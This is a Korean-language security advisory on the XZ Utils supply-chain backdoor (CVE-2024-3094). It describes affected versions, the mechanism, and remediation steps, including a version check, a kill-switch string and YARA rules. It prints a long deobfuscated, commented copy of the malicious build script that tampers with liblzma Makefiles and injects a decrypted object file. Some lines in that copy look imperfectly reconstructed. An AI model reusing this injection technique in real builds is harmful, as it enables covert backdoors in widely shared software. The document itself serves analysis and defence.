# XZ Utils 데이터 압축 라이브러리에 영향을 미치는 공급망 손상 취약점(CVE-2024-3094)
##### 원작자 : 문광일 PM, 김평일 대리, 김태현 사원
##### 작성자 : 김태현 사원
##### 작성일자 : 2024년 4월 7일
</br></br>

## (1) 취약점 설명

2024년 03월 29일자로 CISA(미국 사이버보안 및 인프라 보안국) Alert 페이지에 긴급으로 XZ Utils 데이터 압축 라이브러리 취약점 조치권고가 기재됨.</br></br>
CISA Alert 링크 :</br>
https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094

XZ Utils는 높은 압축률과 빠른 압축 해제를 제공하는 xz 압축 형식용 도구 모음임.</br></br>
XZ Utils 홈페이지(현재 접근 X) :</br>
https://xz.tukaani.org/xz-utils/
</br></br>

모든 GNU/리눅스 운영체제에서 데이터 압축에 필요한 필수 유틸리티를 제공하는 인기 오픈소스인 'XZ Utils' 라이브러리에서 백도어가 발견돼 전 세계 소프트웨어 및 보안 업계에 비상이 걸림.</br>
**특히, 해당 백도어 악성코드는 수많은 기업과 사용자들을 대상으로 한 소프트웨어 공급망 공격으로 볼 수 있어 피해 규모가 어느 정도 확대될지 파장이 커지고 있음.**

해당 취약점(CVE-2024-3094)은 소프트웨어 공급망 공격의 일종으로 **CVSS 3.1 점수는 10.0으로 최대 심각도**를 나타냄.</br>
해당 취약점은 최근 출시된 XZ Utils 버전 5.6.0(2월 24일 출시) 및 5.6.1(3월 9일 출시)에 영향을 미치는 것으로 알려짐.</br></br>
아래와 빠르게 대응이 필요함.</br>
NIST 링크 :</br></br>
https://nvd.nist.gov/vuln/detail/CVE-2024-3094
</br>
</br>
## (2) 취약한 버전 및 개선 버전
<div align="center"><img src="https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/16c8c1b2-f489-4214-a395-d7793d7252e2"></div>
</br>

## (3) 취약점 분석

백도어가 동작하게 되면 sshd의 로그인 프로세스 중 CPU 사용량이 크게 증가하게 되며 sshd 와 관련된 비정상적인 징후가 발생함.</br>

동작 방식은 XZ 빌드 프로세스 중 다음 줄이 포함된 구성 스크립트의 마지막에 실행되는 난독화된 스크립트를 삽입하며, xz-utils 및 liblzma용 MakeFiles 생성을 담당하는 Build-to-Host.m4 스크립트가 실행됨.</br></br>
`gl_[$1]config='sed "r\n" $gl_am_configmake | eval $gl_path_map | $gl[$1]_prefix -d 2>/dev/null'.`</br></br>

구성 스크립트에 포함된 숨겨진 코드는 특정 조건에 따라 백도어를 독점적으로 구현하고 있으며 특히, 구성 스크립트 내의 백도어 설치는 선택적 사항으로 표적 OS가 x86-64 Linux이고 XZ 빌드 프로세스가 Debian 또는 RPM 패키지 빌드의 일부여야 하고 해당 조건을 충족하지 못하면 백도어가 설치되지 않음.</br></br>
`if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1); then`</br></br>

난독화된 스크립트가 실행되면 OS가 x86-64 Linux인지, 빌드가 Debian 또는 RPM 패키지 빌드의 일부인지 확인하는 등 다양한 검사를 수행함.</br></br>
`if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64"; then`</br></br>

해당 스크립트는 런타임 중 심볼 확인을 방해하기 위해 liblzma의 MakeFile을 수정하여 RSA_public_decrypt@....pl 심볼을 악성 백도어 코드로 리디렉션하는 것을 목표로 하며, sshd의 공개 키 인증 프로세스 중에 RSA_public_decrypt@....pl 함수가 호출되어 공격자의 코드가 실행됨.</br></br>

이후 정상적인 인증을 위해 libcrypto를 다시 호출하여 공격자가 특정 조건에서 인증을 우회하여 취약한 서버에서 원격 코드 실행(RCE)으로 이어질 수 있도록 함.</br>

■ 익스플로잇 런타임 요구 사항
1. TERM 환경 변수는 SSH 클라이언트-서버 통신에서 인증 프로세스의 시작을 의미하므로 설정하지 않아야 함
2. 바이너리 경로는 /usr/sbin/sshd여야 하며, 이는 sshd가 liblzma 라이브러리를 사용할 때 악성 코드가 실행됨을 나타냄
3. 심볼 해상도 간섭이 노출되지 않도록 환경 변수 LD_DEBUG 및 LD_PROFILE은 설정되지 않은 상태로 유지함.
4. LANG 환경 변수는 sshd가 항상 설정 하므로 설정이 필요함
5. 익스플로잇은 안티 디버깅 기법을 사용하여 rr 및 gdb와 같은 디버깅 도구를 탐지하고 실행을 방지함

<details><summary>아래 코드는 난독 해제된 주요 코드에 대한 분석 자료임.</summary>
<div mardown="1">
<p>
```# 컴파일러 옵션을 변수에 할당
P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
# pic_flag 변수에 P 변수의 값을 할당
C="pic_flag=\" $P\""
# O 변수 할당
O="^pic_flag=\" -fPIC -DPIC\"$"
# 아키텍처 확장 지원 여부를 판단하는 함수 이름을 변수에 할당
R="is_arch_extension_supported"
# CPU ID를 가져오는 함수의 시작 부분을 변수에 할당
x="__get_cpuid("
# 압축된 파일 이름을 변수에 할당
p="good-large_compressed.lzma"
# 손상된 LZMA2 형식의 파일 이름을 변수에 할당
U="bad-3-corrupt_lzma2.xz"
# zrKcVq 변수를 평가하여 실행
eval $zrKcVq
# config.status 파일이 존재하는지 확인
if test -f config.status; then
  # zrKcSS 변수를 평가하여 실행
  eval $zrKcSS
  # config.status 파일에서 LD, CC, GCC, srcdir, build, enable_shared, enable_static, gl_path_map 변수를 설정
  eval `grep ^LD=\'\/ config.status`
  eval `grep ^CC=\' config.status`
  eval `grep ^GCC=\' config.status`
  eval `grep ^srcdir=\' config.status`
  eval `grep ^build=\'x86_64 config.status`
  eval `grep ^enable_shared=\'yes\' config.status`
  eval `grep ^enable_static=\' config.status`
  eval `grep ^gl_path_map=\' config.status`
  # zrKccj 변수를 평가하여 실행
  eval $zrKccj
  # config.status 파일에서 "HAVE_FUNC_ATTRIBUTE_IFUNC"=" 1"이 설정되지 않았다면 스크립트 종료
  if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
    exit 0
  fi
  # config.h 파일에서 "HAVE_FUNC_ATTRIBUTE_IFUNC"이 정의되지 않았다면 스크립트 종료
  if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
    exit 0
  fi
  # enable_shared 변수가 "yes"가 아니라면 스크립트 종료
  if test "x$enable_shared" != "xyes";then
    exit 0
  fi
  # build 변수가 x86_64로 시작하지 않거나 linux-gnu로 끝나지 않는다면 스크립트 종료
  if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
    exit 0
  fi
fi
# $R() 함수가 crc64_fast.c 파일에 없으면 스크립트 종료
if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
  exit 0
fi
# $R() 함수가 crc32_fast.c 파일에 없으면 스크립트 종료
if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
  exit 0
fi
# $R 변수가 crc_x86_clmul.h 파일에 없으면 스크립트 종료
if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
  exit 0
fi
# $__get_cpuid 함수가 crc_x86_clmul.h 파일에 없으면 스크립트 종료
if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
  exit 0
fi
# GCC 변수가 'yes'가 아니면 스크립트 종료
if test "x$GCC" != 'xyes' > /dev/null 2>&1; then
  exit 0
fi
# CC 변수가 'gcc'가 아니면 스크립트 종료
if test "x$CC" != 'xgcc' > /dev/null 2>&1; then
  exit 0
fi
# LD 변수에 '-v' 옵션을 추가하여 GNU ld가 아니면 스크립트 종료
LDv=$LD" -v"
if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1; then
  exit 0
fi
# $srcdir/tests/files/$p 파일이 없으면 스크립트 종료
if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1; then
  exit 0
fi
# $srcdir/tests/files/$U 파일이 없으면 스크립트 종료
if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1; then
  exit 0
fi
# debian/rules 파일이 있거나 RPM_ARCH 변수가 'x86_64'이면 zrKcst 변수를 평가하여 실행
if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64"; then
  eval $zrKcst
  # src/liblzma/Makefile 파일에서 ACLOCAL_M4 정의가 없으면 스크립트 종료
  j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
  if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1; then
    exit 0
  fi
  # src/liblzma/Makefile 파일에서 am__uninstall_files_from_dir 정의가 없으면 스크립트 종료
  z="^am__uninstall_files_from_dir = {"
  if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1; then
    exit 0
  fi
  # src/liblzma/Makefile 파일에서 am__install_max 정의가 없으면 스크립트 종료
  w="^am__install_max ="
  if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1; then
    exit 0
  fi
  # src/liblzma/Makefile 파일에서 z 변수 정의가 없으면 스크립트 종료
  E=$z
  if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1; then
    exit 0
  fi
fi
# src/liblzma/Makefile 파일에서 am__vpath_adj_setup 정의를 찾지 못하면 스크립트 종료
if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1; then
  exit 0
fi
# src/liblzma/Makefile 파일에서 am__include 정의를 찾지 못하면 스크립트 종료
if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1; then
  exit 0
fi
# src/liblzma/Makefile 파일에서 all: all-recursive 정의를 찾지 못하면 스크립트 종료
if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1; then
  exit 0
fi
# src/liblzma/Makefile 파일에서 LTLIBRARIES 정의를 찾지 못하면 스크립트 종료
if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1; then
  exit 0
fi
# src/liblzma/Makefile 파일에서 AM_V_CCLD 정의를 찾지 못하면 스크립트 종료
if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1; then
  exit 0
fi
# libtool 파일에서 $O 변수를 찾지 못하면 스크립트 종료
if ! grep -qs "$O" libtool > /dev/null 2>&1; then
  exit 0
fi
# zrKcTy 변수를 평가하여 실행
eval $zrKcTy
# Makefile의 $j 검색 결과 바로 위에 $b 변수의 값 삽입
b="am__test = $U"
sed -i "/$j/i$b" src/liblzma/Makefile || true
# gl_path_map 변수에서 슬래시를 이스케이프하는 작업 후, 결과를 $d에 저장
d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
# Makefile의 $w 검색 결과 바로 위에 정의된 $b 변수의 값을 삽입
b="am__strip_prefix = $d"
sed -i "/$w/i$b" src/liblzma/Makefile || true
# Makefile의 $E 검색 결과 바로 위에 $b 변수의 값 삽입
b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
sed -i "/$E/i$b" src/liblzma/Makefile || true
# Makefile의 $Q 검색 결과 바로 위에 $s 변수의 값 삽입
b="\$(top_srcdir)/tests/files/\$(am__test)"
s="am__test_dir=$b"
sed -i "/$Q/i$s" src/liblzma/Makefile || true
# LDFLAGS에 "-z,now" 옵션이 포함되어 있지 않으면 $h 변수에 추가
h="-Wl,--sort-section=name,-X"
if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1; then
  h=$h",-z,now"
fi
# Makefile의 $L 검색 결과 바로 위에 $j 변수의 값 삽입
j="liblzma_la_LDFLAGS += $h"
sed -i "/$L/i$j" src/liblzma/Makefile || true
# libtool 파일에서 $O를 $C로 대체
sed -i "s/$O/$C/g" libtool || true
# Makefile에서 $u를 $k로 대체
k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
sed -i "s/$u/$k/" src/liblzma/Makefile || true
# Makefile의 $m 검색 결과 바로 위에 $l 변수의 값 삽입
l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
    export top_src
    export top_srcdir='\$(top_srcdir)'; \\\\\n\
    export CC='\$(CC)'; \\\\\n\
    export DEFS='\$(DEFS)'; \\\\\n\
    export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
    export INCLUDES='\$(INCLUDES)'; \\\\\n\
    export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
    export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
    export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
    export CFLAGS='\$(CFLAGS)'; \\\\\n\
    export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
    export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
    export libdir='\$(libdir)'; \\\\\n\
    export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
    export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
    # rpath를 사용하여 am__test_dir에서 실행 파일을 찾고, am__dist_setup을 통해 압축 해제 및 실행 환경 구성
    sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
sed -i "/$m/i$l" src/liblzma/Makefile || true
# zrKcHD 변수를 평가하여 실행
eval $zrKcHD
fi
# 먼저, .libs 폴더 내에 liblzma_la-crc64_fast.o 파일과 liblzma_la-crc32_fast.o 파일이 모두 존재하는지 확인함
elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
# 조건을 충족하면 zrKcKQ 변수에 저장된 명령을 실행함
eval $zrKcKQ
# src/liblzma/check/crc64_fast.c 파일에 $R() 문자열이 존재하지 않는 경우 스크립트 실행을 중단함
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
exit 0
fi
# src/liblzma/check/crc32_fast.c 파일에 $R() 문자열이 존재하지 않는 경우 스크립트 실행을 중단함
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
exit 0
fi
# src/liblzma/check/crc_x86_clmul.h 파일에 $R 문자열이 존재하지 않는 경우 스크립트 실행을 중단함
if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
# src/liblzma/check/crc_x86_clmul.h 파일에 $x 문자열이 존재하지 않는 경우 스크립트 실행을 중단함
if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
# ../../libtool 파일에 $C 문자열이 존재하지 않는 경우 스크립트 실행을 중단함
if ! grep -qs "$C" ../../libtool; then
exit 0
fi
# liblzma_la_LINK 변수에 "-z,now" 또는 "-z -Wl,now" 옵션이 포함되어 있지 않은 경우 스크립트 실행을 중단함
if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
exit 0
fi
# liblzma_la_LINK 변수에 "lazy" 옵션이 포함되어 있는 경우 스크립트 실행을 중단함
if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
exit 0
fi
# N과 W 변수를 초기화
N=0
W=0
# $top_srcdir/m4/gettext.m4 파일에서 "dnl Convert it to C string syntax." 문자열을 찾아 Y 변수에 저장함
Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
# zrKcjv 변수에 저장된 명령을 실행함
eval $zrKcjv
# Y 변수가 비어있는 경우 N을 0으로, W를 88792으로 설정함
if test -z "$Y"; then
N=0
W=88792
# 그렇지 않은 경우 N을 88792으로, W를 0으로 설정함
else
N=88792
W=0
fi
# tests/files 폴더 내의 압축된 테스트 파일($p)을 xz 명령으로 해제하고, $i 변수에 저장된 명령을 실행함
# 그 결과를 sed와 awk를 통해 처리하고, 이를 다시 xz로 압축해 단일 스트림으로 만들어 liblzma_la-crc64-fast.o 파일에 저장함
# 모든 명령이 성공적으로 실행되지 않을 경우 true(0)을 반환하여 스크립트가 계속 실행되게 함
xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<4096;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
# liblzma_la-crc64-fast.o 파일이 존재하지 않으면 스크립트 실행을 중단함
if ! test -f liblzma_la-crc64-fast.o; then
exit 0
fi
# .libs 폴더 내에 있는 liblzma_la-crc64_fast.o 파일을 liblzma_la-crc64-fast.o 파일로 복사함
# 복사에 실패해도 스크립트 실행을 중단하지 않음
cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
# V 변수에 특정 조건을 충족하는 아키텍처에서 지원되는 함수를 확인하는 코드를 저장함
V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
# yosA 변수에 저장된 명령을 실행함
eval $yosA
# crc64_fast.c 파일을 수정하여 is_arch_extension_supported() 함수 대신 _is_arch_extension_supported()를 사용하고,
# crc_x86_clmul.h 헤더 파일을 포함하는 코드를 추가함
# 이 변경 사항을 적용하고 컴파일하여 .libs 폴더 내에 새로운 liblzma_la-crc64_fast.o 객체 파일을 생성함
# crc64_fast.c 파일에서 아키텍처 지원 여부를 확인하는 함수를 수정함
# 이를 위해 sed를 사용하여 is_arch_extension_supported() 호출을 _is_arch_extension_supported()로 변경함
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
# crc32_fast.c 파일을 수정하여 is_arch_extension_supported() 함수 대신 _is_arch_extension_supported()를 사용하고,
# crc32_arm64.h 헤더 파일을 포함하는 코드를 추가함
# 이 변경 사항을 적용하고 컴파일하여 .libs 폴더 내에 새로운 liblzma_la-crc32_fast.o 객체 파일을 생성함
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
sed "/include \"crc32_arm64.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
eval $RgYB
# liblzma 라이브러리를 링크하고, 라이브러리가 성공적으로 생성되지 않았다면,
# .libs 폴더 내의 crc32 및 crc64 관련 객체 파일들의 이름을 조정함
if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
    if test ! -f .libs/liblzma.so; then
        mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
        mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
    fi
    # 생성된 라이브러리 파일들을 삭제함
    rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
else
    # 라이브러리 링크 과정이 실패했다면, 객체 파일들의 이름을 조정함
    mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
    mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
# 사용하지 않는 객체 파일들을 삭제함
rm -f .libs/liblzma_la-crc32-fast.o || true
rm -f .libs/liblzma_la-crc64-fast.o || true
# 앞서 진행한 변경 사항이 성공적으로 적용되지 않았다면,
# .libs 폴더 내의 crc32 및 crc64 관련 객체 파일들의 이름을 조정함
else
    mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
    mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
# 마지막으로, 더 이상 필요하지 않은 liblzma_la-crc64-fast.o 파일을 삭제함
rm -f liblzma_la-crc64-fast.o || true
fi
eval $DHLd```</p>
</div>
</details> 
</br>

## (4) 취약점 대응

1. CVE-2024-3094 취약점 여부 탐지 후 개선 버전(다운그레이드)으로 변경 설치</br>
다음을 실행하여 “XZ” 버전이 영향을 받는 버전(5.6.0 or 5.6.1)인지 확인함.</br>
```strings `which xz` | grep '5\.6\.[01]```</br></br>
영향받는 버전일 경우 다음과 같이 출력함.</br>
`xz (XZ Utils) 5.6.1`

또는 Alpine Package Manager 를 사용하여 버전을 확인할 수 있음.
`$ apk list xz
xz-5.6.1-r2 x86_64 {xz} ...`

2. 악성 백도어 기능 비활성화
업그레이드나 다운그레이드가 불가능한 경우, 백도어의 “킬 스위치” 를 통해 악성 백도어 기능을 비활성화가 가능함.
/etc/environment 파일에 다음 문자열을 추가함. (단, SSH 및 Systemd를 다시 시작한 후 적용)
`sudo systemctl restart ssh`</br>

`yolAbejyiejuvnup=Evjtgvsh5okmkAvj`

3. CVE-2024-3094 취약점 탐지 도구 사용
아래 오픈소스 도구를 이용하여 로컬 시스템이 CVE-2024-3094에 취약하고 XZ의 악성 버전이 설치되어 있는지 검사함.</br>
도구 1 : https://github.com/jfrog/cve-2024-3094-tools/tree/main/cve-2024-3094-detector</br>
도구 2.: https://github.com/FabioBaroni/CVE-2024-3094-checker

4. yara 를 이용한 EDR 패턴 업데이트
```
rule BKDR_XZUtil_Script_CVE_2024_3094_Mar24_1 {
   meta:
      description = "Detects make file and script contents used by the backdoored XZ library (xzutil) CVE-2024-3094."
      author = "Florian Roth"
      reference = "https://www.openwall.com/lists/oss-security/2024/03/29/4"
      date = "2024-03-30"
      score = 80
      hash = "d44d0425769fa2e0b6875e5ca25d45b251bbe98870c6b9bef34f7cea9f84c9c3"
   strings:
      $x1 = "/bad-3-corrupt_lzma2.xz | tr " ascii
      $x2 = "/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|" ascii
      $x3 = "eval $zrKcKQ" ascii
   condition:
      1 of them
}
rule BKDR_XZUtil_Binary_CVE_2024_3094_Mar24_1 {
   meta:
      description = "Detects injected code used by the backdoored XZ library (xzutil) CVE-2024-3094."
      author = "Florian Roth"
      reference = "https://www.openwall.com/lists/oss-security/2024/03/29/4"
      date = "2024-03-30"
      score = 75
      hash1 = "319feb5a9cddd81955d915b5632b4a5f8f9080281fb46e2f6d69d53f693c23ae"
      hash2 = "605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4"
      hash3 = "8fa641c454c3e0f76de73b7cc3446096b9c8b9d33d406d38b8ac76090b0344fd"
      hash4 = "b418bfd34aa246b2e7b5cb5d263a640e5d080810f767370c4d2c24662a274963"
      hash5 = "cbeef92e67bf41ca9c015557d81f39adaba67ca9fb3574139754999030b83537"
      hash6 = "5448850cdc3a7ae41ff53b433c2adbd0ff492515012412ee63a40d2685db3049"
   strings:
      $op1 = { 48 8d 7c 24 08 f3 ab 48 8d 44 24 08 48 89 d1 4c 89 c7 48 89 c2 e8 ?? ?? ?? ?? 89 c2 }
      $op2 = { 31 c0 49 89 ff b9 16 00 00 00 4d 89 c5 48 8d 7c 24 48 4d 89 ce f3 ab 48 8d 44 24 48 }
      $op3 = { 4d 8b 6c 24 08 45 8b 3c 24 4c 8b 63 10 89 85 78 f1 ff ff 31 c0 83 bd 78 f1 ff ff 00 f3 ab 79 07 }
      /* function signature from detect.sh provided by Vegard Nossum */
      $xc1 = { F3 0F 1E FA 55 48 89 F5 4C 89 CE 53 89 FB 81 E7 00 00 00 80 48 83 EC 28 48 89 54 24 18 48 89 4C 24 10 }
   condition:
      uint16(0) == 0x457f
      and (
         all of ($op*)
         or $xc1
      )
}
rule BKDR_XZUtil_KillSwitch_CVE_2024_3094_Mar24_1 {
   meta:
      description = "Detects kill switch used by the backdoored XZ library (xzutil) CVE-2024-3094."
      author = "Florian Roth"
      reference = "https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01?permalink_comment_id=5006558#gistcomment-5006558"
      date = "2024-03-30"
      score = 85
   strings:
      $x1 = "yolAbejyiejuvnup=Evjtgvsh5okmkAvj"
   condition:
      $x1
}
```
</br>

## (5) 참고 사이트

https://openwall.com/lists/oss-security/2024/03/29/4</br>
https://www.boannews.com/media/view.asp?idx=128350&kind=&sub_kind=</br>
https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/</br>
https://www.picussecurity.com/resource/blog/cve-2024-3094-a-backdoor-in-xz-utils-leads-to-remote-code-execution</br>
https://vulcan.io/blog/alert-cve-2024-3094

